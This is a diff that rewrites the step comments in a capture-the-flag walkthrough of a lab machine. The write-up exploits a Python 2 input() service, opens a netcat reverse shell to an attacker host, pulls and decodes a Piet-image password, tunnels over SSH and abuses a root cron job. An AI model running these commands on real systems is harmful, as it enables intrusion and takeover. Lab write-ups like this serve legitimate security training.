@@ -52,8 +52,8 @@ cron tick ? /bin/sh -i as root ? root.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: full port scan with high performance options.
+# Why here: discover all open ports to identify the custom service on port 10000.
 nmap -sS -Pn -n -p- --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,10000 $TARGET -oA service
 ```
@@ -73,8 +73,8 @@ Full technique: [python-input-injection.md](../../exploits/web-rce/python-input-
 
 Open `:10000` in a browser / `curl`:
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: probe the unknown service on port 10000.
+# Why here: trigger a response or error to identify the technology (Python 2 in this case).
 curl http://$TARGET:10000/
 # Private 0days
 #  Please enther number of exploits to send??: Traceback (most recent call last):
@@ -85,26 +85,26 @@ curl http://$TARGET:10000/
 
 Py `input()` evaluates its argument. Confirm + RCE:
 ```bash
-# What it does: envia un payload de codigo al servicio usando netcat.
-# Why here: explotar el servicio haciendo que evalue entrada controlada.
+# What it does: send a Python snippet to the service via netcat.
+# Why here: exploit the Py2 input() function to execute an arbitrary system command.
 echo "__import__('os').system('id')" | nc $TARGET 10000
 # uid=1000(king) gid=1000(king) groups=1000(king),...
 ```
 
 Reverse shell:
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a local listener to catch the reverse shell.
+# Why here: wait for the incoming connection from the target machine.
 nc -lvnp 4444
-# What it does: envia un payload de codigo al servicio usando netcat.
-# Why here: explotar el servicio haciendo que evalue entrada controlada.
+# What it does: send a Python payload that executes a netcat reverse shell.
+# Why here: establish a remote interactive session as the 'king' user.
 echo "__import__('os').system('nc -e /bin/bash $LHOST 4444')" | nc $TARGET 10000
 ```
 
 Stabilise:
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: spawn a PTY shell using Python.
+# Why here: upgrade the simple netcat shell to a more functional interactive terminal.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -121,16 +121,16 @@ Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md
 Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).
 
 ```bash
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: list all files in the current home directory including hidden ones.
+# Why here: check for available files, scripts, and potential loot like the image file.
 ls -lha
 # -rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
 # -rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
 # -rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
 # -rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
 # -rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the content of the user flag.
+# Why here: confirm initial access success and capture the first milestone.
 cat user.txt
 ```
 
@@ -145,28 +145,28 @@ Full technique: [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md).
 Exfil and triage:
 ```bash
 # Target
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: start a temporary web server on the target.
+# Why here: facilitate the exfiltration of the credentials.png file to the attacker machine.
 python3 -m http.server 8888
 # Attacker
-# What it does: downloads the specified URL to disk.
-# Why here: bring evidence, payloads or files needed to advance.
+# What it does: download the image file from the target.
+# Why here: perform offline steganography analysis on the local machine.
 wget http://$TARGET:8888/credentials.png
-# What it does: extracts readable strings from a binary or file.
-# Why here: buscar credenciales, rutas o tokens embebidos.
+# What it does: search for ASCII strings in the PNG file.
+# Why here: check for low-hanging fruit like cleartext passwords or clues in the image data.
 strings credentials.png    # empty
-# What it does: inspects or extracts hidden content/metadata from a file.
-# Why here: recover clues or credentials hidden in assets.
+# What it does: read EXIF metadata from the image.
+# Why here: check for hidden comments or metadata fields that might contain credentials.
 exiftool credentials.png   # nothing useful
-# What it does: identifies file type and metadata.
-# Why here: choose the correct parser or technique.
+# What it does: verify the file type.
+# Why here: confirm the file structure before attempting to decode it as a Piet program.
 file credentials.png       # PNG, blocky grid of saturated colours ? Piet
 ```
 
 Run:
 ```bash
-# What it does: instala la herramienta o paquete local necesario.
-# Why here: tener disponible el helper antes de ejecutar la tecnica.
+# What it does: install the npiet interpreter.
+# Why here: obtain the necessary tool to execute the identified Piet steganography.
 sudo apt install npiet
 ./npiet credentials.png
 # c00ffe123!
@@ -174,8 +174,8 @@ sudo apt install npiet
 
 Use it:
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in via SSH as king.
+# Why here: establish a permanent and stable foothold using the recovered credentials.
 ssh king@$TARGET
 # password: c00ffe123!
 ```
@@ -189,11 +189,11 @@ Tools: [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/
 Full technique: [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md).
 
 ```bash
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: check allowed sudo commands for the current user.
+# Why here: identify quick paths to privilege escalation via sudoers misconfigurations.
 sudo -l                                  # nothing
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the system crontab file.
+# Why here: identify scheduled tasks that might be running with root privileges.
 cat /etc/crontab
 # *  *    * * *   king    cd /home/king/ && bash run.sh
 # *  *    * * *   root    cd /home/king/ && bash root.sh
@@ -208,8 +208,8 @@ cat root.sh
 
 Confirm cron tick rate:
 ```bash
-# What it does: filters text with the specified pattern.
-# Why here: extract the important clue from a large output.
+# What it does: monitor the system logs for cron activity.
+# Why here: verify the execution frequency of the identified scheduled tasks.
 tail -f /var/log/syslog | grep -i cron
 ```
 
@@ -221,8 +221,8 @@ netstat -tulpn
 
 Tunnel it:
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish an SSH local port forward.
+# Why here: expose the internal web service (127.0.0.1:8080) to the attacker's local machine.
 ssh -L 8080:localhost:8080 king@$TARGET
 # Browser ? http://localhost:8080  (web uploader)
 ```
@@ -238,8 +238,8 @@ subprocess.call(["/bin/sh", "-i"])
 
 Listener + wait:
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a listener for the root reverse shell.
+# Why here: catch the connection triggered by the cron job executing the uploaded script.
 nc -lvnp 1337
 #  one minute later 
 # whoami ? root
@@ -252,8 +252,8 @@ See [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) for the SSH forwar
 ## 6. Root Flag
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the root flag.
+# Why here: complete the machine and document the final goal.
 cat /root/root.txt
 ```
 
